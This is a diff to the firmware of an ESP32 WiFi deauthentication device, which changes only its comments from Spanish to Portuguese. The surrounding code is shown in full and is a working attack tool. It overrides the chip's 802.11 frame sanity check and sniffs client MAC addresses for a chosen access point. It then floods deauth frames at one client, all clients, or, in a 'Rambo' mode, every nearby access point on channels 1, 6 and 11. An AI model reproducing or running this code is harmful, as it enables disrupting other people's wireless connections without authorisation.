@@ -8,9 +8,9 @@
 
 extern TFT_eSPI tft;
 // ═══════════════════════════════════════════════════════════════════════════
-//  PATCH · anula la validacion de frames 802.11
-//  Este override solo funciona si se aplico el comando objcopy --weaken-symbol
-//  sobre libnet80211.a (ver README del proyecto)
+//  PATCH · anula a validação de frames 802.11
+//  Este override só funciona se o comando objcopy --weaken-symbol foi aplicado
+//  sobre libnet80211.a (veja o README do projeto)
 // ═══════════════════════════════════════════════════════════════════════════
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg,
                                                  int32_t arg2,
@@ -19,7 +19,7 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg,
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CONFIGURACIÓN
+//  CONFIGURAÇÃO
 // ═══════════════════════════════════════════════════════════════════════════
 #define MAX_APS             30
 #define MAX_CLIENTS         15
@@ -50,7 +50,7 @@ static int        apCount = 0;
 static ClientInfo clients[MAX_CLIENTS];
 static int        clientCount = 0;
 
-// Estado del ataque
+// Estado do ataque
 static volatile unsigned long deauthPackets = 0;
 static APInfo     activeAP;
 static uint8_t    activeTargetMac[6];
@@ -102,7 +102,7 @@ static String formatTime(unsigned long ms) {
     return String(buf);
 }
 
-// Envía 1 deauth frame con el target, BSSID y reason especificados
+// Envia 1 deauth frame com o target, BSSID e reason especificados
 static void sendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
     memcpy(&deauthFrame[4],  target, 6);   // destination
     memcpy(&deauthFrame[10], bssid,  6);   // source (BSSID)
@@ -175,12 +175,12 @@ static void scanAPs() {
     int barX = 10, barY = 90, barW = 300, barH = 14;
     tft.drawRect(barX, barY, barW, barH, UI_ACCENT);
 
-    // WiFi scan estándar (modo STA)
+    // WiFi scan padrão (modo STA)
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     delay(100);
 
-    // Scan asíncrono
+    // Scan assíncrono
     WiFi.scanNetworks(true, true);   // async, show_hidden
 
     unsigned long scanStart = millis();
@@ -202,7 +202,7 @@ static void scanAPs() {
         delay(100);
     }
 
-    // Esperar a que termine si aún está corriendo
+    // Espera terminar se ainda estiver rodando
     int n = WiFi.scanComplete();
     while (n == WIFI_SCAN_RUNNING) {
         delay(100);
@@ -230,7 +230,7 @@ static void scanAPs() {
 
     WiFi.scanDelete();
 
-    // Ordenar por RSSI desc
+    // Ordena por RSSI desc
     for (int i = 0; i < apCount - 1; i++) {
         for (int j = 0; j < apCount - 1 - i; j++) {
             if (aps[j].rssi < aps[j + 1].rssi) {
@@ -247,7 +247,7 @@ static void scanAPs() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  SELECCIÓN DE AP (+ Rambo + Rescan + Back)
+//  SELEÇÃO DE AP (+ Rambo + Rescan + Back)
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawAPList(int cursor, int scrollOffset) {
     tft.fillScreen(TFT_BLACK);
@@ -411,7 +411,7 @@ static bool confirmRambo() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  MENÚ DE ACCIÓN (después de seleccionar AP)
+//  MENU DE AÇÃO (depois de selecionar o AP)
 //  Broadcast now | Scan clients | Back
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawActionMenu(int cursor, const APInfo& ap) {
@@ -491,7 +491,7 @@ static int selectAction(const APInfo& ap) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  SCAN DE CLIENTES (modo promiscuo filtrando por BSSID del AP)
+//  SCAN DE CLIENTES (modo promíscuo filtrando pelo BSSID do AP)
 // ═══════════════════════════════════════════════════════════════════════════
 static uint8_t scanTargetBSSID[6];
 
@@ -506,8 +506,8 @@ static void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     //   bytes 4-9   = destination (addr1)
     //   bytes 10-15 = source (addr2)
     //   bytes 16-21 = BSSID (addr3)
-    // Los clientes son dispositivos donde su MAC aparece como src/dst
-    // y el BSSID coincide con el AP target
+    // Os clientes são dispositivos cujo MAC aparece como src/dst
+    // e o BSSID coincide com o AP alvo
 
     uint8_t* addr1 = &payload[4];
     uint8_t* addr2 = &payload[10];
@@ -515,12 +515,12 @@ static void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
     uint8_t* clientMac = nullptr;
 
-    // Frame del cliente al AP (addr3 = BSSID = AP, addr2 = cliente)
+    // Frame do cliente para o AP (addr3 = BSSID = AP, addr2 = cliente)
     if (memcmp(addr3, scanTargetBSSID, 6) == 0 &&
         memcmp(addr2, scanTargetBSSID, 6) != 0) {
         clientMac = addr2;
     }
-    // Frame del AP al cliente (addr2 = AP, addr1 = cliente)
+    // Frame do AP para o cliente (addr2 = AP, addr1 = cliente)
     else if (memcmp(addr2, scanTargetBSSID, 6) == 0 &&
              memcmp(addr1, scanTargetBSSID, 6) != 0 &&
              addr1[0] != 0xFF) {  // no broadcast
@@ -532,7 +532,7 @@ static void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     // Filtrar multicast
     if (clientMac[0] & 0x01) return;
 
-    // Buscar si ya está
+    // Verifica se já existe
     for (int i = 0; i < clientCount; i++) {
         if (memcmp(clients[i].mac, clientMac, 6) == 0) {
             clients[i].rssi = pkt->rx_ctrl.rssi;
@@ -541,7 +541,7 @@ static void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
         }
     }
 
-    // Agregar nuevo
+    // Adiciona novo
     memcpy(clients[clientCount].mac, clientMac, 6);
     clients[clientCount].macStr = macToStr(clientMac);
     clients[clientCount].rssi   = pkt->rx_ctrl.rssi;
@@ -566,7 +566,7 @@ static void scanClients(const APInfo& ap) {
     int barX = 10, barY = 80, barW = 300, barH = 14;
     tft.drawRect(barX, barY, barW, barH, UI_ACCENT);
 
-    // Setup promiscuous mode en el canal del AP
+    // Setup do modo promíscuo no canal do AP
     WiFi.mode(WIFI_MODE_NULL);
     delay(50);
 
@@ -588,7 +588,7 @@ static void scanClients(const APInfo& ap) {
         int fillW = (int)((barW - 2) * progress);
         tft.fillRect(barX + 1, barY + 1, fillW, barH - 2, UI_SELECT);
 
-        // Redibujar lista de clientes si cambió
+        // Redesenha a lista de clientes se mudou
         if (clientCount != lastDrawnCount) {
             tft.fillRect(10, 105, 300, 100, TFT_BLACK);
             drawStringCustom(10, 105, "Clients: " + String(clientCount),
@@ -620,7 +620,7 @@ static void scanClients(const APInfo& ap) {
     esp_wifi_deinit();
     delay(100);
 
-    // Ordenar por RSSI desc
+    // Ordena por RSSI desc
     for (int i = 0; i < clientCount - 1; i++) {
         for (int j = 0; j < clientCount - 1 - i; j++) {
             if (clients[j].rssi < clients[j + 1].rssi) {
@@ -637,7 +637,7 @@ static void scanClients(const APInfo& ap) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  SELECCIÓN DE TARGET (cliente o ALL)
+//  SELEÇÃO DE TARGET (cliente ou ALL)
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawClientList(int cursor, int scrollOffset) {
     tft.fillScreen(TFT_BLACK);
@@ -740,7 +740,7 @@ static int selectTarget() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  PANTALLA DE ATAQUE
+//  TELA DE ATAQUE
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawAttackFrame() {
     tft.fillScreen(TFT_BLACK);
@@ -809,7 +809,7 @@ static void runAttackLoop() {
     beep(3600, 60); delay(20);
     beep(2400, 80);
 
-    // ── Setup WiFi para raw tx ──────────────────────────────────────────
+    // ── Setup do WiFi para raw tx ──────────────────────────────────────────
     WiFi.mode(WIFI_MODE_NULL);
     delay(50);
 
@@ -820,7 +820,7 @@ static void runAttackLoop() {
     esp_wifi_start();
     esp_wifi_set_promiscuous(true);
 
-    // En modo Rambo rotamos canales, si no, fijamos uno
+    // No modo Rambo giramos os canais; senão, fixamos um
     const int ramboChannels[] = {1, 6, 11};
     int ramboIdx = 0;
 
@@ -844,16 +844,16 @@ static void runAttackLoop() {
     bool okHeld = false;
 
     while (!stopAttack) {
-        // ── Enviar deauth(s) ───────────────────────────────────────────
+        // ── Envia deauth(s) ───────────────────────────────────────────
         if (ramboMode) {
-            // Atacar a cada AP que coincida con el canal actual
+            // Ataca cada AP que coincida com o canal atual
             int curChan = ramboChannels[ramboIdx];
             for (int i = 0; i < apCount; i++) {
                 if (aps[i].channel == curChan) {
-                    // Broadcast deauth: source=BSSID del AP, dest=FF:FF:..
+                    // Broadcast deauth: source=BSSID do AP, dest=FF:FF:..
                     sendDeauth(broadcastMac, aps[i].bssid);
-                    // También deauth en sentido inverso (AP → cliente)
-                    // para tirar la conexión desde ambos lados
+                    // Também deauth no sentido inverso (AP → cliente)
+                    // para derrubar a conexão dos dois lados
                     sendDeauth(aps[i].bssid, aps[i].bssid);
                 }
             }
@@ -861,7 +861,7 @@ static void runAttackLoop() {
             const uint8_t* targetMac = broadcastMode ? broadcastMac
                                                       : activeTargetMac;
             sendDeauth(targetMac, activeAP.bssid);
-            // Reverse deauth también
+            // Reverse deauth também
             if (!broadcastMode) {
                 sendDeauth(activeAP.bssid, activeAP.bssid);
             }
@@ -887,7 +887,7 @@ static void runAttackLoop() {
             drawAttackStats(now - startMs, deauthPackets, rate);
         }
 
-        // ── Detectar OK HOLD ───────────────────────────────────────────
+        // ── Detecta OK HOLD ───────────────────────────────────────────
         if (digitalRead(BTN_OK) == LOW) {
             if (!okHeld) {
                 okPressStart = millis();
@@ -920,7 +920,7 @@ static void runAttackLoop() {
 //  MAIN
 // ═══════════════════════════════════════════════════════════════════════════
 void runDeauther() {
-    // Esperar liberación de OK
+    // Espera a liberação do OK
     while (digitalRead(BTN_OK) == LOW) delay(5);
     delay(100);
 
@@ -929,7 +929,7 @@ void runDeauther() {
 
     // Loop principal
     while (true) {
-        // 2. Scan APs si no hay
+        // 2. Scan de APs se não houver
         if (apCount == 0) scanAPs();
 
         if (apCount == 0) {
@@ -957,7 +957,7 @@ void runDeauther() {
             continue;
         }
 
-        // 3. Seleccionar AP o RAMBO
+        // 3. Seleciona AP ou RAMBO
         int apChoice = selectAP();
 
         if (apChoice == -3) break;          // BACK
@@ -975,7 +975,7 @@ void runDeauther() {
             continue;
         }
 
-        // AP específico seleccionado
+        // AP específico selecionado
         activeAP = aps[apChoice];
         ramboMode = false;
 
@@ -1008,7 +1008,7 @@ void runDeauther() {
             continue;
         }
 
-        // 5. Select target (cliente o ALL)
+        // 5. Select target (cliente ou ALL)
         while (true) {
             int target = selectTarget();
 
